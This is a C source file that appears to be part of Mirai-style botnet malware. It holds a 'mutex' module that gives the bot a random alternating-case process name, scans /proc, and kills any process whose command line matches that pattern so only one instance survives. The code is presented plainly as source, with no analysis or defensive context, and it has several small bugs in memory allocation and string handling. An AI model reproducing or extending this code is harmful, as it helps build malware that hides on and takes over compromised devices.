#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/prctl.h>

#include "rand.h"
#include "utils.h"
#include "mutex.h"

static int mutex_verify_algo_lowhigh(char *mutex)
{
    int i = 0;

    for (i = 0; i < MUTEX_LEN; i++)
    {
        if (i % 2 == 0)
        {
            if (mutex[i] <= 64 || mutex[i] >= 91)
                return 0;
        }
        else
        {
            if (mutex[i] <= 96 || mutex[i] >= 123)
                return 0;
        }
    }

    return 1;
}

static char *mutex_algo_lowhigh()
{
    int i;
    char *mutex = malloc(MUTEX_LEN * sizeof(char *));
    if (mutex == NULL)
        return NULL;

    for (i = 0; i < MUTEX_LEN; i++)
    {
        char alph;

        if (i % 2 == 0)
            alph = (rand_next() % (90 - 65)) + 65;
        else
            alph = (rand_next() % (122 - 97)) + 97;

        mutex[i] = alph;
    }

    return mutex;
}

char *mutex_new_instance()
{
    DIR *dir;
    struct dirent *file;
    int tmp;

    if ((dir = opendir("/proc/")) == NULL)
        return NULL;

    if ((tmp = open("/proc/self/cmdline", O_RDONLY)) == -1)
        return NULL;

#ifdef DEBUG
    printf("[main] Searching for old processes\n");
#endif
  
    while ((file = readdir(dir)) != NULL)
    {
        if (*(file->d_name) < '0' || *(file->d_name) > '9')
            continue;

        char rdbuf[128], path[32];
        int path_len = utils_strlen(file->d_name), fd, ret, pid = atoi(file->d_name);

        utils_memcpy(path, "/proc/", 6);
        utils_memcpy(path + 6, file->d_name, path_len);
        utils_memcpy(path + 6 + path_len, "/cmdline\0",  9);

        if ((fd = open(path, O_RDONLY)) == -1)
        {
            utils_memset(path, 0, sizeof(path));
            utils_memset(rdbuf, 0, sizeof(rdbuf));
            continue;
        }

        if ((ret = read(fd, rdbuf, sizeof(rdbuf))) <= 0)
        {
            close(fd);
            utils_memset(path, 0, sizeof(path));
            utils_memset(rdbuf, 0, sizeof(rdbuf));
            continue;
        }

        close(fd);
        utils_memset(path, 0, sizeof(path));

        if (mutex_verify_algo_lowhigh(rdbuf) == 1)
        {
#ifdef DEBUG
        	printf("[main] Killing old process under PID %d\n", pid);
#endif
            kill(pid, 9);
            utils_memset(rdbuf, 0, sizeof(rdbuf));
            continue;
        }

        utils_memset(rdbuf, 0, sizeof(rdbuf));
    }

    return mutex_algo_lowhigh();
}